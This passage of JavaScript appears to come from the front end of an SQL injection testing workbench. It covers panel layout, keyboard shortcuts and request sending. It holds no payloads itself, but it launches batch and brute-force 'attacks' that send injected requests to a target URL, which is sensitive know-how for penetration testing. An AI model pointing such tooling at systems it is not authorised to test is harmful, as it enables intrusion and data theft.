          vpanelBackdrop.classList.add('open');
        }
      }
      if (typeof updateShelfBtn === 'function') updateShelfBtn(name);
      updatePinTray();
    }

    // ===== Pin tray + Alt+I shelf =====
    const PIN_TRAY_LABELS = {
      payload: 'Payload',
      history: 'History',
      cheatsheet: 'Cheats',
      proxy: 'Proxy',
      settings: 'Settings',
      tools: 'Tools',
      'payload-lib': 'Saved',
      converter: 'Converter',
    };
    function getPinnedPanelNames() {
      return [...PINNABLE].filter((name) => {
        const el = $(VPANEL_MAP[name]);
        return el && el.classList.contains('pinned') && el.classList.contains('open');
      });
    }

    function updatePinTray() {
      // Keep per-panel ↓/↑ buttons in sync with tray / Alt+I / Alt+K
      if (typeof updateShelfBtn === 'function' && typeof PINNABLE !== 'undefined') {
        [...PINNABLE].forEach((n) => updateShelfBtn(n));
      }
      const tray = $('#pinTray');
      if (!tray) return;
      const names = getPinnedPanelNames();
      if (!names.length) {
        tray.innerHTML = '';
        return;
      }
      tray.innerHTML = names.map((name) => {
        const el = $(VPANEL_MAP[name]);
        const shelved = el?.classList.contains('shelved');
        const label = PIN_TRAY_LABELS[name] || name;
        return `<button type="button" class="pin-tray-item${shelved ? ' is-shelved' : ' is-active'}" data-pin-tray="${name}">${escapeHtml(label)}</button>`;
      }).join('');
      tray.querySelectorAll('[data-pin-tray]').forEach((btn) => {
        btn.addEventListener('click', () => togglePinShelf(btn.dataset.pinTray));
      });
    }

    function setPanelShelved(name, shelved) {
      const el = $(VPANEL_MAP[name]);
      if (!el || !el.classList.contains('pinned')) return;
      el.classList.toggle('shelved', !!shelved);
      if (!shelved) {
        focusPanel(name);
      }
      if (typeof updateShelfBtn === 'function') updateShelfBtn(name);
      updatePinTray();
    }

    function togglePinShelf(name) {
      const el = $(VPANEL_MAP[name]);
      if (!el || !el.classList.contains('pinned') || !el.classList.contains('open')) return;
      setPanelShelved(name, !el.classList.contains('shelved'));
    }

    /** Alt+I — shelf/restore all pinned open panels */
    document.addEventListener('keydown', (e) => {
      if (!e.altKey || e.ctrlKey || e.metaKey) return;
      if (e.key === 'i' || e.key === 'I') {
        e.preventDefault();
        toggleAllPinnedShelf();
      } else if (e.key === 'k' || e.key === 'K') {
        e.preventDefault();
        cyclePinnedPanels();
      }
    });

    /** Alt+K — cycle pinned panels one-by-one; after the last, hide all (none visible). */
    function cyclePinnedPanels() {
      const names = getPinnedPanelNames();
      if (!names.length) {
        showToast('No pinned panels');
        return;
      }
      // Stable order by z-index (low → high), same as tray stack
      const ranked = names.slice().sort((a, b) => {
        const za = parseInt($(VPANEL_MAP[a])?.style.zIndex || '0', 10) || 0;
        const zb = parseInt($(VPANEL_MAP[b])?.style.zIndex || '0', 10) || 0;
        return za - zb;
      });
      const visibleIdx = ranked
        .map((n, i) => {
          const el = $(VPANEL_MAP[n]);
          return el && !el.classList.contains('shelved') ? i : -1;
        })
        .filter((i) => i >= 0);

      // Prefer the front-most visible as "current"
      let cur = -1;
      if (visibleIdx.length) {
        const front = ranked.findIndex((n) => {
          const el = $(VPANEL_MAP[n]);
          return el && !el.classList.contains('shelved') && el.classList.contains('panel-front');
        });
        cur = front >= 0 ? front : visibleIdx[visibleIdx.length - 1];
      }

      if (visibleIdx.length === 0) {
        // All hidden → show first
        ranked.forEach((n, i) => setPanelShelved(n, i !== 0));
        focusPanel(ranked[0]);
        showToast(`Focus: ${PIN_TRAY_LABELS[ranked[0]] || ranked[0]}`, 'success');
      } else if (cur >= ranked.length - 1) {
        // On last → hide all (extra step after the last tab)
        ranked.forEach((n) => setPanelShelved(n, true));
        showToast('All pinned panels hidden', 'success');
      } else {
        // Show next only
        const next = cur + 1;
        ranked.forEach((n, i) => setPanelShelved(n, i !== next));
        focusPanel(ranked[next]);
        showToast(`Focus: ${PIN_TRAY_LABELS[ranked[next]] || ranked[next]}`, 'success');
      }
      updatePinTray();
    }

    function toggleAllPinnedShelf() {
      const names = getPinnedPanelNames();
      if (!names.length) {
        showToast('No pinned panels');
        return;
      }
      const anyVisible = names.some((n) => {
        const el = $(VPANEL_MAP[n]);
        return el && !el.classList.contains('shelved');
      });
      names.forEach((n) => setPanelShelved(n, anyVisible));
      showToast(anyVisible ? 'Pinned panels shelved (Alt+I)' : 'Pinned panels restored', 'success');
    }


    function setupPinnedDrag(panelSel, handleSel) {
      const handle = $(handleSel);
      if (!handle) return;
      // pointer events track better than mouse; flatten transform so left/top match the cursor
      handle.addEventListener('pointerdown', (e) => {
        const panel = $(panelSel);
        if (!panel || !panel.classList.contains('pinned') || !panel.classList.contains('open')) return;
        if (e.button != null && e.button !== 0) return;
        if (e.target.closest('button, input, select, textarea, a, .vpanel-close-cluster')) return;

        e.preventDefault();
        e.stopPropagation();

        const rect = panel.getBoundingClientRect();
        // Flatten any CSS transform / right-based layout into fixed left+top
        panel.style.position = 'fixed';
        panel.style.left = rect.left + 'px';
        panel.style.top = rect.top + 'px';
        panel.style.width = rect.width + 'px';
        panel.style.height = rect.height + 'px';
        panel.style.right = 'auto';
        panel.style.bottom = 'auto';
        panel.style.transform = 'none';
        panel.style.margin = '0';
        panel.classList.add('no-transition', 'is-dragging');

        const ox = e.clientX - rect.left;
        const oy = e.clientY - rect.top;
        const minVisible = 48;

        const onMove = (ev) => {
          let x = ev.clientX - ox;
          let y = ev.clientY - oy;
          const maxX = Math.max(0, window.innerWidth - minVisible);
          const maxY = Math.max(0, window.innerHeight - minVisible);
          // Keep at least minVisible px of the panel on-screen
          x = Math.max(-(rect.width - minVisible), Math.min(maxX, x));
          y = Math.max(0, Math.min(maxY, y));
          panel.style.left = x + 'px';
          panel.style.top = y + 'px';
        };
        const onUp = () => {
          panel.classList.remove('no-transition', 'is-dragging');
          try { handle.releasePointerCapture(e.pointerId); } catch (err) {}
          document.removeEventListener('pointermove', onMove, true);
          document.removeEventListener('pointerup', onUp, true);
          document.removeEventListener('pointercancel', onUp, true);
        };
        try { handle.setPointerCapture(e.pointerId); } catch (err) {}
        document.addEventListener('pointermove', onMove, true);
        document.addEventListener('pointerup', onUp, true);
        document.addEventListener('pointercancel', onUp, true);
      });
    }

    function setupPinnedResize(panelSel) {
      $$(panelSel + ' .resize-grip').forEach((grip) => {
        grip.addEventListener('mousedown', (e) => {
          const panel = $(panelSel);
          if (!panel || !panel.classList.contains('pinned')) return;
          e.preventDefault();
          e.stopPropagation();
          const dir = grip.dataset.resize;
          const startX = e.clientX;
          const startY = e.clientY;
          const rect = panel.getBoundingClientRect();
          panel.style.right = 'auto';
          panel.style.left = rect.left + 'px';
          panel.style.top = rect.top + 'px';
          panel.style.width = rect.width + 'px';
          panel.style.height = rect.height + 'px';
          panel.classList.add('no-transition');
          const minW = 280, minH = 200;
          const onMove = (ev) => {
            let w = rect.width, h = rect.height, l = rect.left, t = rect.top;
            const dx = ev.clientX - startX;
            const dy = ev.clientY - startY;
            if (dir.includes('e')) w = Math.max(minW, rect.width + dx);
            if (dir.includes('s')) h = Math.max(minH, rect.height + dy);
            if (dir.includes('w')) { w = Math.max(minW, rect.width - dx); l = rect.left + (rect.width - w); }
            if (dir.includes('n')) { h = Math.max(minH, rect.height - dy); t = rect.top + (rect.height - h); }
            panel.style.width = w + 'px';
            panel.style.height = h + 'px';
            panel.style.left = l + 'px';
            panel.style.top = t + 'px';
          };
          const onUp = () => {
            panel.classList.remove('no-transition');
            document.removeEventListener('mousemove', onMove);
            document.removeEventListener('mouseup', onUp);
          };
          document.addEventListener('mousemove', onMove);
          document.addEventListener('mouseup', onUp);
        });
      });
    }

    ['payload', 'history', 'cheatsheet', 'proxy', 'settings', 'tools', 'payload-lib', 'converter'].forEach((name) => {
      const sel = PIN_BTN_SEL[name];
      const btn = sel ? $(sel) : null;
      if (!btn) return;
      btn.addEventListener('click', (e) => {
        e.stopPropagation();
        const panel = $(VPANEL_MAP[name]);
        if (!panel) return;
        setPanelPinned(name, !panel.classList.contains('pinned'), PIN_DEFAULTS[name]);
      });
      const shelfSel = SHELF_BTN_SEL[name];
      const shelfBtn = shelfSel ? $(shelfSel) : null;
      if (shelfBtn) {
        shelfBtn.addEventListener('click', (e) => {
          e.preventDefault();
          e.stopPropagation();
          // Per-panel shelf — same action as clicking that panel in the pin tray
          togglePinShelf(name);
        });
      }
    });
    setupPinnedDrag('#payloadWorkbench', '#payloadDragHandle');
    setupPinnedDrag('#historyPanel', '#historyDragHandle');
    setupPinnedDrag('#cheatSheetPanel', '#cheatDragHandle');
    setupPinnedDrag('#proxyPanel', '#proxyDragHandle');
    setupPinnedDrag('#payloadLibPanel', '#payloadLibDragHandle');
    setupPinnedDrag('#converterPanel', '#converterDragHandle');
    setupPinnedDrag('#settingsPanel', '#settingsDragHandle');
    setupPinnedDrag('#toolsPanel', '#toolsDragHandle');
    setupPinnedResize('#payloadWorkbench');
    setupPinnedResize('#historyPanel');
    setupPinnedResize('#cheatSheetPanel');
    setupPinnedResize('#proxyPanel');
    setupPinnedResize('#payloadLibPanel');
    setupPinnedResize('#converterPanel');
    setupPinnedResize('#settingsPanel');
    setupPinnedResize('#toolsPanel');

    // Click any open panel → bring to front (Windows-style)
    Object.keys(VPANEL_MAP).forEach((name) => {
      const el = $(VPANEL_MAP[name]);
      if (!el) return;
      el.addEventListener('mousedown', (e) => {
        if (!el.classList.contains('open')) return;
        // Don't steal focus from nested interactive when closing
        if (e.target.closest('[data-close-panel], .pin-btn, button')) return;
        focusPanel(name);
      }, true);
    });

    // Keep legacy names used elsewhere
    // ===== Keyboard Shortcuts System =====
    // Use Ctrl+Alt / function keys to avoid browser conflicts (Ctrl+P print, Ctrl+H history, Ctrl+F find, …)
    const SHORTCUTS_KEY = 'sqli-workbench-shortcuts-v3';
    const DEFAULT_SHORTCUTS = {
      openPayload:   { label: 'Open Payload', group: 'Panels', key: 'p', ctrl: true, shift: false, alt: true },
      openHistory:   { label: 'Open History', group: 'Panels', key: 'h', ctrl: true, shift: false, alt: true },
      openTools:     { label: 'Open Tools', group: 'Panels', key: 'k', ctrl: true, shift: false, alt: true },
      openSettings:  { label: 'Open Settings', group: 'Panels', key: 's', ctrl: true, shift: false, alt: true },
      sendRequest:   { label: 'Send Request', group: 'Actions', key: 'Enter', ctrl: false, shift: false, alt: false },
      cancelRequest: { label: 'Cancel Send / Stop Attack', group: 'Actions', key: 'Enter', ctrl: true, shift: false, alt: false },
      closePanel:    { label: 'Close panel', group: 'Panels', key: 'Escape', ctrl: false, shift: false, alt: false },
      histDelete:    { label: 'Delete selected history item', group: 'History', key: 'Delete', ctrl: false, shift: false, alt: false },
      histRename:    { label: 'Rename selected history item', group: 'History', key: 'F2', ctrl: false, shift: false, alt: false },
      histStar:      { label: 'Star/unstar selected item', group: 'History', key: 's', ctrl: false, shift: true, alt: false },
      histSearch:    { label: 'Focus history search', group: 'History', key: 'f', ctrl: true, shift: false, alt: true },
      pinPayload:    { label: 'Toggle pin Payload', group: 'Panels', key: 'p', ctrl: true, shift: true, alt: true },
      pinHistory:    { label: 'Toggle pin History', group: 'Panels', key: 'h', ctrl: true, shift: true, alt: true },
      injectPayload: { label: 'Inject payload into URL', group: 'Actions', key: 'i', ctrl: true, shift: false, alt: true },
    };

    function loadShortcuts() {
      try {
        const saved = JSON.parse(localStorage.getItem(SHORTCUTS_KEY) || '{}');
        const out = {};
        Object.keys(DEFAULT_SHORTCUTS).forEach((id) => {
          out[id] = { ...DEFAULT_SHORTCUTS[id], ...(saved[id] || {}) };
        });
        return out;
      } catch {
        return { ...DEFAULT_SHORTCUTS };
      }
    }

    let shortcuts = loadShortcuts();

    function saveShortcuts() {
      const toSave = {};
      Object.keys(shortcuts).forEach((id) => {
        const s = shortcuts[id];
        toSave[id] = { key: s.key, ctrl: s.ctrl, shift: s.shift, alt: s.alt };
      });
      try { localStorage.setItem(SHORTCUTS_KEY, JSON.stringify(toSave)); } catch {}
    }

    function formatShortcut(s) {
      if (!s || !s.key) return '—';
      const parts = [];
      if (s.ctrl) parts.push('Ctrl');
      if (s.alt) parts.push('Alt');
      if (s.shift) parts.push('Shift');
      let k = s.key;
      if (k === ' ') k = 'Space';
      if (k === 'Escape') k = 'Esc';
      if (k.length === 1) k = k.toUpperCase();
      parts.push(k);
      return parts.join('+');
    }

    function eventMatchesShortcut(e, s) {
      if (!s || !s.key) return false;
      const key = e.key.length === 1 ? e.key.toLowerCase() : e.key;
      const sk = s.key.length === 1 ? s.key.toLowerCase() : s.key;
      if (key !== sk && e.key !== s.key) return false;
      // For plain letter shortcuts without modifiers, require no ctrl/meta/alt
      // except when the shortcut itself requires them
      if (!!s.ctrl !== !!(e.ctrlKey || e.metaKey)) return false;
      if (!!s.shift !== !!e.shiftKey) return false;
      if (!!s.alt !== !!e.altKey) return false;
      return true;
    }

    function isTypingTarget(el) {
      if (!el) return false;
      const tag = (el.tagName || '').toLowerCase();
      if (tag === 'input' || tag === 'textarea' || tag === 'select') return true;
      if (el.isContentEditable) return true;
      return false;
    }

    function startRenameHistoryItem(id) {
      const nameEl = historyList && historyList.querySelector(`.history-name[data-id="${id}"]`);
      if (!nameEl) return;
      nameEl.contentEditable = 'true';
      nameEl.focus();
      const range = document.createRange();
      range.selectNodeContents(nameEl);
      const sel = window.getSelection();
      sel.removeAllRanges();
      sel.addRange(range);
    }

    function runShortcutAction(id) {
      switch (id) {
        case 'openPayload': toggleVPanel('payload'); break;
        case 'openHistory': toggleVPanel('history'); break;
        case 'openTools': toggleVPanel('tools'); break;
        case 'openSettings': toggleVPanel('settings'); break;
        case 'sendRequest': if (typeof sendRequest === 'function') sendRequest(); break;
        case 'cancelRequest': if (typeof cancelInFlightRequest === 'function') cancelInFlightRequest(); break;
        case 'closePanel':
          if (activeVPanel) {
            const el = $(VPANEL_MAP[activeVPanel]);
            if (el && el.classList.contains('pinned')) return; // don't force-close pinned via Esc shortcut if same as closePanel
            closeVPanel(activeVPanel);
          }
          break;
        case 'histDelete':
          if (state.activeHistoryId != null) deleteHistoryItem(state.activeHistoryId);
          break;
        case 'histRename':
          if (state.activeHistoryId != null) startRenameHistoryItem(state.activeHistoryId);
          break;
        case 'histStar': {
          if (state.activeHistoryId == null) break;
          const item = state.history.find((h) => h.id === state.activeHistoryId);
          if (item) {
            item.pinned = !item.pinned;
            renderHistory();
            showToast(item.pinned ? 'Starred' : 'Unstarred');
          }
          break;
        }
        case 'histSearch': {
          openVPanel('history');
          setTimeout(() => { const s = $('#historySearch'); if (s) s.focus(); }, 150);
          break;
        }
        case 'pinPayload': {
          const panel = $('#payloadWorkbench');
          if (!panel.classList.contains('open')) openVPanel('payload');
          setPanelPinned('payload', !panel.classList.contains('pinned'), {
            top: '80px', right: '24px', width: '420px', height: '420px',
          });
          break;
        }
        case 'pinHistory': {
          const panel = $('#historyPanel');
          if (!panel.classList.contains('open')) openVPanel('history');
          setPanelPinned('history', !panel.classList.contains('pinned'), {
            top: '72px', left: '16px', width: '360px', height: Math.min(window.innerHeight * 0.7, 620) + 'px',
          });
          break;
        }
        case 'injectPayload': {
          const btn = $('#injectBtn');
          if (btn) btn.click();
          break;
        }
        default: break;
      }
    }

    // Global shortcut listener
    document.addEventListener('keydown', (e) => {
      // Don't intercept while rebinding
      if (window.__shortcutListening) return;
      const modal = $('#modalOverlay');
      if (modal && modal.classList.contains('open')) return;
      const attackDlg = $('#attackNameDialog');
      if (attackDlg && attackDlg.classList.contains('open')) return;

      const typing = isTypingTarget(e.target);

      for (const [id, s] of Object.entries(shortcuts)) {
        if (!eventMatchesShortcut(e, s)) continue;

        // When typing in inputs, only allow shortcuts that use Ctrl/Meta/Alt (or F-keys / Escape / Delete outside pure text)
        if (typing) {
          const isMod = s.ctrl || s.alt;
          const isSpecial = ['Escape', 'F2', 'Delete', 'Enter'].includes(s.key);
          // Allow Ctrl+Enter send even in inputs; allow F2/Delete only when not in a text field for rename context
          if (id === 'cancelRequest' && s.ctrl && s.key === 'Enter') {
            e.preventDefault();
            runShortcutAction(id);
            return;
          }
          // Enter alone to send — only from URL field (not payload textarea / notes)
          if (id === 'sendRequest' && !s.ctrl && s.key === 'Enter') {
            const t = e.target;
            if (t && (t.id === 'urlInput' || t.classList.contains('url-input'))) {
              e.preventDefault();
              runShortcutAction(id);
              return;
            }
            continue;
          }
          if (!isMod && !(id === 'closePanel' && s.key === 'Escape')) {
            continue;
          }
          if (id.startsWith('hist') && (e.target.closest && e.target.closest('.hist-note, .history-search, [contenteditable="true"]'))) {
            // allow F2/Delete only when not editing note/search/name
            if (e.target.closest('.hist-note, .history-search') || e.target.isContentEditable) continue;
          }
        }

        // History-context shortcuts require history open or an active item
        if (id.startsWith('hist') && id !== 'histSearch') {
          const histOpen = $('#historyPanel')?.classList.contains('open');
          if (!histOpen && state.activeHistoryId == null) continue;
        }

        e.preventDefault();
        runShortcutAction(id);
        return;
      }
    });

    // Shortcuts settings UI
    let listeningFor = null;
    function renderShortcutsList() {
      const list = $('#shortcutsList');
      if (!list) return;
      const groups = {};
      Object.entries(shortcuts).forEach(([id, s]) => {
        const g = s.group || 'Other';
        if (!groups[g]) groups[g] = [];
        groups[g].push({ id, ...s });
      });
      list.innerHTML = Object.entries(groups).map(([group, items]) => `
        <div style="font-size:10px;font-weight:700;color:var(--text-muted);text-transform:uppercase;letter-spacing:0.5px;margin:10px 0 4px;">${escapeHtml(group)}</div>
        ${items.map((s) => `
          <div class="shortcut-row" data-id="${s.id}">
            <div class="shortcut-label">${escapeHtml(s.label)}</div>
            <button type="button" class="shortcut-key" data-id="${s.id}">${formatShortcut(s)}</button>
          </div>
        `).join('')}
      `).join('');

      list.querySelectorAll('.shortcut-key').forEach((btn) => {
        btn.addEventListener('click', () => {
          list.querySelectorAll('.shortcut-key').forEach((b) => {
            b.classList.remove('listening');
            b.textContent = formatShortcut(shortcuts[b.dataset.id]);
          });
          btn.classList.add('listening');
          btn.textContent = 'Press keys…';
          listeningFor = btn.dataset.id;
          window.__shortcutListening = true;
        });
      });
    }

    document.addEventListener('keydown', (e) => {
      if (!window.__shortcutListening || !listeningFor) return;
      e.preventDefault();
      e.stopPropagation();
      if (e.key === 'Escape') {
        window.__shortcutListening = false;
        listeningFor = null;
        renderShortcutsList();
        return;
      }
      // ignore pure modifier presses
      if (['Control', 'Shift', 'Alt', 'Meta'].includes(e.key)) return;
      const id = listeningFor;
      shortcuts[id] = {
        ...shortcuts[id],
        key: e.key.length === 1 ? e.key.toLowerCase() : e.key,
        ctrl: !!(e.ctrlKey || e.metaKey),
        shift: !!e.shiftKey,
        alt: !!e.altKey,
      };
      saveShortcuts();
      window.__shortcutListening = false;
      listeningFor = null;
      renderShortcutsList();
      showToast('Shortcut saved', 'success');
    }, true);

    const shortcutsResetBtn = $('#shortcutsResetBtn');
    if (shortcutsResetBtn) {
      shortcutsResetBtn.addEventListener('click', () => {
        try { localStorage.removeItem(SHORTCUTS_KEY); } catch {}
        shortcuts = loadShortcuts();
        renderShortcutsList();
        showToast('Shortcuts reset', 'success');
      });
    }

    // promptAttackMeta → static/js/attack.js

    // Legacy collapse API → virtual panels
    function setupCollapse() { /* no-op: panels are virtual now */ }
    setupCollapse();

    // ===== Panel Resize (drag) =====
    function setupResize(handleId, panelSel, cssVar, minW, maxRatio) {
      const handle = $(handleId);
      const panel = $(panelSel);
      if (!handle || !panel) return;
      let startX = 0, startW = 0;
      handle.addEventListener('mousedown', (e) => {
        e.preventDefault();
        startX = e.clientX;
        startW = panel.getBoundingClientRect().width;
        panel.classList.add('no-transition');
        handle.classList.add('dragging');
        document.body.classList.add('resizing');
        const onMove = (ev) => {
          let dx = ev.clientX - startX;
          // history handle is after the panel, so dragging right grows it; cheat same
          let w = startW + dx;
          const maxW = window.innerWidth * (maxRatio || 0.5);
          w = Math.max(minW || 160, Math.min(maxW, w));
          panel.style.width = w + 'px';
          panel.style.minWidth = w + 'px';
          if (cssVar) document.documentElement.style.setProperty(cssVar, w + 'px');
        };
        const onUp = () => {
          panel.classList.remove('no-transition');
          handle.classList.remove('dragging');
          document.body.classList.remove('resizing');
          document.removeEventListener('mousemove', onMove);
          document.removeEventListener('mouseup', onUp);
        };
        document.addEventListener('mousemove', onMove);
        document.addEventListener('mouseup', onUp);
      });
    }
    setupResize('#resizeCheat', '#toolsPanel', '--cheat-width', 160, 0.4);
    setupResize('#resizeHistory', '#historyPanel', '--history-width', 200, 0.55);

    // ===== Response minimize / History focus =====
    const responsePanel = $('#responsePanel');
    const minimizeResponseBtn = $('#minimizeResponseBtn');
    const responseMiniLabel = $('#responseMiniLabel');
    const focusHistoryBtn = $('#focusHistoryBtn');
    const historyPanelEl = $('#historyPanel');

    function setResponseCollapsed(collapsed) {
      if (!responsePanel) return;
      responsePanel.classList.toggle('collapsed-panel', collapsed);
      if (historyPanelEl) historyPanelEl.classList.toggle('expanded-focus', collapsed);
      if (focusHistoryBtn) focusHistoryBtn.textContent = collapsed ? '⧉' : '⛶';
    }
    if (minimizeResponseBtn) {
      minimizeResponseBtn.addEventListener('click', () => setResponseCollapsed(true));
    }
    if (responseMiniLabel) {
      responseMiniLabel.addEventListener('click', () => setResponseCollapsed(false));
    }
    if (focusHistoryBtn) {
      focusHistoryBtn.addEventListener('click', () => {
        const isCollapsed = responsePanel && responsePanel.classList.contains('collapsed-panel');
        setResponseCollapsed(!isCollapsed);
      });
    }

    // ===== Attack panel minimize =====
    const attackConfigHeader = $('#attackConfigHeader');
    const atkMinBtn = $('#atkMinBtn');
    function toggleAttackPanelMin() {
      const panel = $('#attackConfigPanel');
      if (!panel || panel.classList.contains('hidden')) return;
      panel.classList.toggle('minimized');
      if (atkMinBtn) atkMinBtn.textContent = panel.classList.contains('minimized') ? '▸' : '▾';
    }
    if (attackConfigHeader) {
      attackConfigHeader.addEventListener('click', (e) => {
        if (e.target.closest('input, select, button') && e.target.id !== 'atkMinBtn') return;
        toggleAttackPanelMin();
      });
    }

    // Payload collapse + one-line summary when collapsed
    const payloadWorkbench = $('#payloadWorkbench');
    const collapsePayloadBtn = $('#collapsePayloadBtn');
    const payloadHeader = $('#payloadHeader');
    const payloadSummary = $('#payloadSummary');

    function updatePayloadSummary() {
      if (!payloadSummary) return;
      const raw = (payloadInput && payloadInput.value || '').trim();
      if (!raw) {
        payloadSummary.textContent = '— empty — click to edit —';
        return;
      }
      const lines = raw.split('\n').filter(Boolean);
      const first = lines[0].slice(0, 80);
      const extra = lines.length > 1 ? `  ·  ${lines.length} lines` : '';
      payloadSummary.textContent = first + (lines[0].length > 80 ? '…' : '') + extra;
    }

    function setPayloadCollapsed(collapsed) {
      // Virtual panel: collapsed = closed — but never force-close when pinned
      if (collapsed) {
        const el = $('#payloadWorkbench');
        if (el && el.classList.contains('pinned')) {
          updatePayloadSummary();
          return;
        }
        closeVPanel('payload');
      } else {
        openVPanel('payload');
      }
      updatePayloadSummary();
    }

    function togglePayload() {
      toggleVPanel('payload');
    }

    if (payloadInput) {
      payloadInput.addEventListener('input', updatePayloadSummary);
    }
    updatePayloadSummary();

    if (collapsePayloadBtn) {
      collapsePayloadBtn.addEventListener('click', (e) => { e.stopPropagation(); togglePayload(); });
    }
    if (payloadHeader) {
      payloadHeader.addEventListener('click', (e) => {
        if (e.target.closest('.collapse-btn')) return;
        togglePayload();
      });
    }

    // ===== Attack engine → static/js/attack.js (brace, $, runAttack, config UI) =====
    // Runtime API on window: detectAttackMode, refreshAttackPanel, runAttack, runDollarAttack,
    // applyPayloadPlaceholders, applySinglePayload, setAttackControls, …


    async function executeOneRequest(url, method, postBody, customHeaders, payloadText, batchId, batchName, attackIndex, opts) {
      opts = opts || {};
      const body = { url, method, headers: customHeaders };
      if (['POST', 'PUT', 'PATCH'].includes(method)) {
        body.post_data = postBody || '';
      }
      const activeProxy = typeof getActiveProxyUrl === 'function' ? getActiveProxyUrl() : '';
      if (activeProxy) body.proxy = activeProxy;
      let respData = null;
      try {
        const apiBase = (window.location.port === '5000') ? '' : 'http://127.0.0.1:5000';
        const fetchOpts = {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(body),
        };
        if (opts.signal) fetchOpts.signal = opts.signal;
        const res = await fetch(`${apiBase}/api/send-payload`, fetchOpts);
        const data = await res.json();
        if (data.proxy_stats && typeof applyServerProxyStats === 'function') {
          applyServerProxyStats(data.proxy_stats);
        }
        if (!res.ok || data.error) {
          respData = {
            status: data.status_code || 0,
            statusText: data.error || res.statusText || 'Error',
            timeMs: data.response_time_ms || 0,
            headers: data.headers || {},
            body: data.raw_body || data.error || 'Request failed',
            fixedHtml: null,
          };
        } else {
          respData = {
            status: data.status_code,
            statusText: data.status_text || '',
            timeMs: data.response_time_ms || 0,
            headers: data.headers || {},
            body: data.raw_body || '',
            fixedHtml: data.fixed_html || data.raw_body || '',
            finalUrl: data.final_url || url,
          };
        }
      } catch (err) {
        if (err && (err.name === 'AbortError' || opts.signal?.aborted)) {
          respData = {
            status: 0,
            statusText: 'Cancelled',
            timeMs: 0,
            headers: {},
            body: 'Request cancelled by user',
            fixedHtml: null,
            cancelled: true,
          };
        } else {
          respData = {
            status: 0,
            statusText: 'Proxy Unreachable',
            timeMs: 0,
            headers: {},
            body: String(err),
            fixedHtml: null,
          };
        }
      }

      const entry = {
        id: state.nextId++,
        name: null,
        method,
        url,
        originalUrl: urlInput.value.trim(),
        payload: payloadText,
        postBody: postBody || '',
        headers: { ...customHeaders },
        response: respData,
        pinned: false,
        timestamp: Date.now(),
        batchId: batchId || null,
        batchName: batchName || null,
        attackIndex: attackIndex != null ? attackIndex : null,
        note: '',
      };
      state.history.push(entry);
      if (typeof scheduleHistorySave === 'function') scheduleHistorySave();

      // Discover endpoints while recording (manual Send / attack too)
      if (state.recording) {
        recordEndpoint(url, method, postBody);
      }

      return entry;
    }



    function cancelInFlightRequest() {
      if (state.attack && state.attack.active) {
        state.attack.stop = true;
        state.attack.paused = false;
        showToast('Stopping attack…');
        return;
      }
      if (state.isSending) {
        if (state._sendAbort) {
          try { state._sendAbort.abort(); } catch (e) {}
        }
        state._sendAbort = null;
        state.isSending = false;
        if (typeof syncSendButtonsSending === 'function') syncSendButtonsSending(false);
        showToast('Request cancelled', 'success');
      }
    }

    async function sendRequest() {
      // Attack running → same button stops the attack
      if (state.attack.active) {
        state.attack.stop = true;
        state.attack.paused = false;
        showToast('Stopping attack…');
        return;
      }
      // Cancel in-flight single request (same button acts as Cancel)
      if (state.isSending && !state.attack.active) {
        if (state._sendAbort) {
          try { state._sendAbort.abort(); } catch {}
        }
        state._sendAbort = null;
        state.isSending = false;
        syncSendButtonsSending(false);
        showToast('Request cancelled', 'success');
        return;
      }
      if (state.attack.active || state._attackLock) return;
      if (state.isSending) return;

      const url = urlInput.value.trim();
      if (!url) { showToast('Enter a target URL'); urlInput.focus(); return; }

      if (typeof rememberUrl === 'function') rememberUrl(url);

      const mode = detectAttackMode();

      if (mode.isBatch) {
        if (mode.mode === 'dollar') {
          const combos = estimateDollarCombos(mode.slots);
          if (combos > 50000) {
            showToast(`Too many combinations (${combos}). Narrow charsets (max 50k).`);
            return;
          }
          if (combos < 1) {
            showToast('Select at least one charset for each $ slot');
            return;
          }
          await runDollarAttack(mode.slots);
          return;
        }
        if (mode.payloads.length > 500) {
          showToast(`Too many payloads (${mode.payloads.length}). Max 500.`);
          return;
        }
        await runAttack(mode.payloads);
        return;
      }

      // Single request — AbortController so Cancel works during long timeouts
      state.isSending = true;
      state._sendAbort = new AbortController();
      syncSendButtonsSending(true);

      const method = methodSelect.value;
      const payload = payloadInput.value.trim();
      let postBody = postBodyInput ? postBodyInput.value : '';

      const finalUrl = applyPayloadPlaceholders(url);
      postBody = applyPayloadPlaceholders(postBody);
      const customHeaders = buildRequestHeaders(postBody);

      const entry = await executeOneRequest(
        finalUrl, method, postBody, customHeaders, payload, null, null, null,
        { signal: state._sendAbort.signal }
      );
      state._sendAbort = null;
      state.activeHistoryId = entry.id;

      if (!entry.response?.cancelled) {
        $$('.tab-btn').forEach(b => b.classList.remove('active'));
        $$('.tab-content').forEach(c => c.classList.remove('active'));
        const renderedTabBtn = document.querySelector('.tab-btn[data-tab="rendered"]');
        if (renderedTabBtn) renderedTabBtn.classList.add('active');
        const renderedTab = $('#tab-rendered');
        if (renderedTab) renderedTab.classList.add('active');
        activeTab = 'rendered';
        displayResponse(entry.response, finalUrl);
        renderHistory();
        if (typeof setPayloadCollapsed === 'function') setPayloadCollapsed(true);
        if (entry.response.status > 0) {
          showToast(`#${entry.id} → ${entry.response.status} (${entry.response.timeMs}ms)`, 'success');
        }
      } else {
        // cancelled — remove empty history entry if we want cleaner list
        const idx = state.history.findIndex((h) => h.id === entry.id);
        if (idx >= 0 && entry.response.cancelled) {
          state.history.splice(idx, 1);
          renderHistory();
        }
      }

      state.isSending = false;
      syncSendButtonsSending(false);
    }

    function syncSendButtonsSending(sending) {
      [sendBtn, $('#payloadSendBtn')].forEach((b) => {
        if (!b) return;
        b.classList.toggle('loading', !!sending);
        // Keep enabled so user can click Cancel
        b.disabled = false;
        const textEl = b.querySelector('.btn-text');
        if (sending) {
          if (textEl) textEl.textContent = 'Cancel';
          else b.textContent = 'Cancel';
          b.classList.add('is-cancel');
        } else {
          b.classList.remove('is-cancel');
          // restore label from attack mode
          if (typeof detectAttackMode === 'function' && typeof syncSendButtonsLabel === 'function') {
            syncSendButtonsLabel(!!detectAttackMode().isBatch);
          } else if (textEl) {
            textEl.textContent = 'Send Request';
          }
        }
      });
    }

    sendBtn.addEventListener('click', sendRequest);
    $('#payloadSendBtn')?.addEventListener('click', (e) => {
      e.preventDefault();
      e.stopPropagation();
      sendRequest();
    });
    $('#payloadAttackBtn')?.addEventListener('click', (e) => {
      e.preventDefault();
      e.stopPropagation();
      if (typeof refreshAttackPanel === 'function') refreshAttackPanel();
